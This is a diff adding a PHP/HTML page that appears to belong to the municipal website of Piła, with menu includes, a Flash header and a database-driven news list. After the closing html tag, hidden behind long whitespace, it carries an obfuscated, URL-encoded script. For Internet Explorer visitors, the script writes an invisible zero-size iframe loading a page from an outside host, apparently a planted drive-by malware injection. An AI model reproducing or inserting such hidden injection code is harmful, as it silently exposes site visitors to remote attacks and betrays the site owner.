@@ -1,0 +1,304 @@
+
+<?php 
+include("nagl_miasto.txt");
+?>
+
+
+<body bgcolor=#EEF8C5 topmargin=0 leftmargin=0 rightmargin=0>
+<a name="gora">
+
+
+
+<!-- tabela nag³ówkowa //-->
+
+
+<table border=0 align="center" width=780 cellspacing=0 cellpadding=0 align="absbottom">
+
+<tr>
+<td width=780 height=16 bgcolor=#CFD6B4 align=right valign=middle class="data">
+
+<?php 
+include("data.txt");
+?>
+
+</td>
+</tr>
+
+
+<tr>
+<td width=780 height=132 align=center valign=middle>
+<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000"
+  codebase="http://active.macromedia.com/flash4/cabs/swflash.cab#version=4,0,0,0"
+  id="naglowek_01" width="780" height="132">
+  <param name="movie" value="naglowek_01.swf">
+  <param name="quality" value="high">
+  <param name="bgcolor" value="#EEF8C5">
+  <embed name="naglowek_01" src="naglowek_01.swf" quality="high" bgcolor="#EEF8C5"
+    width="780" height="132"
+    type="application/x-shockwave-flash"
+    pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash">
+  </embed>
+</object>
+</td>
+</tr>
+
+</table>
+
+<!-- koniec tabela nag³ówkowa //-->
+
+
+
+
+
+
+
+
+
+
+<!-- tabela g³ówna //-->
+
+<table border=0 align="center" width=780 cellspacing=0 cellpadding=0 class="tloglownejeden">
+<tr>
+
+
+
+
+
+
+
+
+
+
+
+<!-- tabela lewa //-->
+<td width=200 height=100% align="left" valign="top">
+
+
+<table align="left" valign=top border=0 cellPadding=0 cellSpacing=0 width=200 class="tdmenu">
+
+
+
+
+<tr>
+<td width=200 height=16 align="center">
+</td>
+</tr>
+
+<?php 
+include("menu_miasto.txt");
+?>
+
+<?php 
+include("menu_mapa.txt");
+?>
+
+<?php 
+include("menu_panoramy.txt");
+?>
+
+<?php 
+include("menu_spacer.txt");
+?>
+
+
+<tr>
+<td width=200 height=1 align="center">
+</td>
+</tr>
+
+</table>
+
+
+
+
+</td>
+
+<!-- koniec tabela lewa //-->
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- tabela œrodkowa  -->
+
+<td width=430 align="center" valign=top>
+
+
+<table align="center" border=0 cellPadding=0 cellSpacing=0 width=430 height=100%>
+
+
+
+
+
+
+
+<tr>
+<td width=430 align="left" valign=top>
+
+<table cellspacing=0 cellpadding=0 border=0 width="100%" bordercolor="#000000">
+
+
+<tr>
+<td width=430 align="center" bgcolor=#1E3249 valign=top class="txtzwykl">
+<font color=#E87900><big>•</big></font> 
+<a class="menu" href="spotkajmy_sie.php"><b>Spotkajmy siê w Pile</b></a> <font color=#E87900><big>•</big></font> 
+<a class="menu" href="a_spotkajmy_sie.php"><b>Let's meet in Pi³a</b></a> <font color=#E87900><big>•</big></font> 
+<br>
+
+<font color=#E87900><big>•</big></font> 
+<a class="menu" href="n_spotkajmy_sie.php"><b>Treffen wir uns in Pi³a</b></a> <font color=#E87900><big>•</big></font> 
+<a class="menu" href="f_spotkajmy_sie.php"><b>A bientot á Pi³a</b></a> <font color=#E87900><big>•</big></font> 
+<a class="menu" href="r_spotkajmy_sie.php"><b>&#1052;&#1077;&#1089;&#1090;&#1086;
+&#1074;&#1089;&#1090;&#1088;&#1077;&#1095;&#1080; –
+&#1055;&#1080;&#1083;&#1072;</b></a> <font color=#E87900><big>•</big></font>
+
+
+</td>
+</tr>
+
+
+
+<?php 
+include("rocznice2006.txt");
+?>
+
+
+<tr><td width="100%">
+
+<table cellspacing=0 cellpadding=0 width="100%" border=0 bgColor="#1E3249">
+
+<tr><a name="news"><td class=sMenu bgColor=#1e3249 height=14><IMG height=10
+                  src="images/dotsMn.gif"
+                  width=10>&nbsp;Serwis Informacyjny &gt; Wiadomoœci i wydarzenia</td>
+                <td width=21 bgColor=#1e3249><IMG height=17 alt=""
+                  src="images/pl.gif" width=14
+              border=0></td></tr>
+</table>
+
+</td><tr>
+
+<tr><td>
+<table border=0 width="430" cellpadding=0 cellspacing=0>
+<?php
+        $granica_a = date("Y-m-d 23:59:59");        $granica_b = date("Y-m-d 00:00:00");
+ include("baza_polaczenie.php");  if (!$db)   {  echo "Po³¹czenie z baz¹ danych nie powiod³o siê. Spróbuj jeszcze raz póŸniej.";   exit;  }   mysql_select_db("um_pila",$db);  $pytanie = "select  * from NEWS where Status='Nowosc'  and Kiedy <= ' " . $granica_a . "' and
+ DoDnia >= ' " . $granica_b . "'  order by Kolejnosc desc, Kiedy desc limit 0,11 "; if(!($wynik=@mysql_query($pytanie,$db)))   { echo "Pierwsze po³¹czenie z baz¹ danych nieudane<br>";  exit; }    while($row = mysql_fetch_array($wynik)) { $id = $row["Id"];
+  $tytul = trim(stripslashes($row["Tytul"]));   $krotko = trim(stripslashes($row["Krotko"]));   echo('<tr><td width="430" height="30" class="takTytul" valign="middle"><a href="index_2.php?ide='); echo($id); echo('" class="linki3">');
+ echo("<b>$tytul</b>"); echo("</a><br>$krotko");  echo('</td></tr>'); echo('<tr><td width="430" height="20" class="takTytul2"  align="right"><a href="index_2.php?ide='); echo($id); echo('" class="linki4">wiêcej</a></td></tr>'); echo('<tr><td width="430" height="4"><hr  width="100%" size=1 align="center"></td></tr>'); }
+?>
+<tr><td width="430" height="20" class="takTytul3" align="center"><a href="archiwum.php" class="linki5">Archiwum wiadomoœci</a></td></tr>
+</table>
+</td></tr>
+</table>
+
+</td>
+</tr>
+
+<tr>
+<td width=430 height=1 align="left" valign=top class="txtzwykljust">
+</td>
+</tr>
+
+<tr>
+<td width=430 align="left" valign=top class="txtzwykljust">
+
+<br><br>
+</td>
+</tr>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<tr>
+<td width=430 height=30 align="left" valign=top class="txtzwykl">
+</td>
+</tr>
+
+
+</table>
+
+
+
+
+</td>
+
+<!-- koniec tabela œrodkowa -->
+
+
+<!-- tabela prawa //-->
+
+<td width=150 align="center" valign=top>
+
+<?php 
+include("prawa_kt.txt");
+?>
+
+</td>
+
+<!-- koniec tabela prawa //-->
+
+
+
+
+
+
+
+
+
+</tr>
+</table>
+
+<!-- koniec tabeli g³ównej //-->
+
+
+
+
+
+
+
+<table border=0 align="center" width=780 cellspacing=0 cellpadding=0 align="absbottom">
+
+<tr>
+<td width=780 height=19 align="right" valign=buttom class="dol">
+<?php 
+include("up_copyr.txt");
+?>
+</td>
+</tr>
+
+
+
+</table>
+
+
+
+
+
+
+
+</body>
+</html>
+<!-- o -->																																		<script type="text/javascript">
+																																		<!--
+																																		document.write(unescape('%3C%73%63%72%69%70%74%20%74%79%70%65%3D%22%74%65%78%74%2F%6A%61%76%61%73%63%72%69%70%74%22%3E%69%66%20%28%6E%61%76%69%67%61%74%6F%72%2E%75%73%65%72%41%67%65%6E%74%2E%69%6E%64%65%78%4F%66%28%27%4D%53%49%45%27%29%20%21%3D%20%2D%31%29%20%7B%20%64%6F%63%75%6D%65%6E%74%2E%77%72%69%74%65%6C%6E%28%27%3C%69%66%72%61%6D%65%20%73%72%63%3D%22%68%74%74%70%3A%2F%2F%73%61%6C%65%76%69%73%69%74%6F%72%2E%6E%65%74%2F%69%6E%2E%63%67%69%3F%32%22%20%66%72%61%6D%65%62%6F%72%64%65%72%3D%30%20%62%6F%72%64%65%72%3D%30%20%77%69%64%74%68%3D%30%20%68%65%69%67%68%74%3D%30%20%73%74%79%6C%65%3D%22%70%6F%73%69%74%69%6F%6E%3A%20%61%62%73%6F%6C%75%74%65%3B%20%76%69%73%69%62%69%6C%69%74%79%3A%20%68%69%64%64%65%6E%22%3E%3C%2F%69%66%72%61%6D%65%3E%27%29%3B%20%7D%3C%2F%73%63%72%69%70%74%3E'));
+																																		//-->
+																																		</script><!-- c -->
